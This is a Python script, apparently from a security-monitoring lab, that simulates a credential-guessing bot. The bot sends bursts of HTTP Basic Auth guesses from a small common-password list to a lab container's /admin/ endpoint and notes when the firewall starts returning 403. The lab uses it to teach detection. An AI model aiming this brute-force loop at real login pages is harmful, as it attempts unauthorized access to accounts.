#!/usr/bin/env python3
"""attacker.py — simulated credential-guessing bot (the "red team" container).

This is the threat the lab asks students to DETECT. It runs inside the lab's
isolated Docker network and only contacts the lab web container (host "web"),
repeatedly requesting the password-protected /admin/ endpoint with wrong
credentials. nginx answers 401, which is exactly the signal the SOC broker
watches for.

Everything here is a teaching stand-in for a real brute-force tool:
  * a short, obviously-fake wordlist (no real credential dictionary),
  * a fixed source identity so students can see one IP light up,
  * a burst-then-pause rhythm so the 401s cluster into a visible window.

If the lab's firewall blocks this container's IP, requests start returning 403
instead of 401. The script notices that and reports it, which is how students
confirm the automated response actually worked.
"""
import base64
import os
import time
import urllib.request

BASE = "http://web"
TARGET = "/admin/"

# Deliberately tiny, fake wordlist — enough to generate failed logins, nothing
# resembling a real attack dictionary.
USERNAMES = ["root", "admin", "administrator", "test", "oracle", "guest"]
PASSWORDS = ["123456", "password", "admin", "letmein", "changeme", "qwerty"]

BURST = int(os.environ.get("ATTACK_BURST", "12"))        # guesses per burst
GAP = float(os.environ.get("ATTACK_GAP", "0.25"))        # seconds between guesses
PAUSE = float(os.environ.get("ATTACK_PAUSE", "8"))       # seconds between bursts


def attempt(user, pw):
    """Return the HTTP status for one login guess (401 wrong, 403 blocked)."""
    token = base64.b64encode(f"{user}:{pw}".encode()).decode()
    req = urllib.request.Request(BASE + TARGET, method="GET")
    req.add_header("Authorization", f"Basic {token}")
    try:
        with urllib.request.urlopen(req, timeout=3) as r:
            return r.status
    except urllib.error.HTTPError as e:
        return e.code
    except Exception:
        return 0


def main():
    print(f"[attacker] credential-guessing bot started, target {BASE}{TARGET}", flush=True)
    while True:
        blocked = 0
        for i in range(BURST):
            user = USERNAMES[i % len(USERNAMES)]
            pw = PASSWORDS[i % len(PASSWORDS)]
            code = attempt(user, pw)
            if code == 403:
                blocked += 1
            time.sleep(GAP)

        if blocked:
            print(f"[attacker] got {blocked} x 403 — looks like we've been firewalled. "
                  f"Backing off.", flush=True)
            time.sleep(PAUSE * 4)
        else:
            print(f"[attacker] burst of {BURST} login attempts sent (all 401).", flush=True)
            time.sleep(PAUSE)


if __name__ == "__main__":
    main()
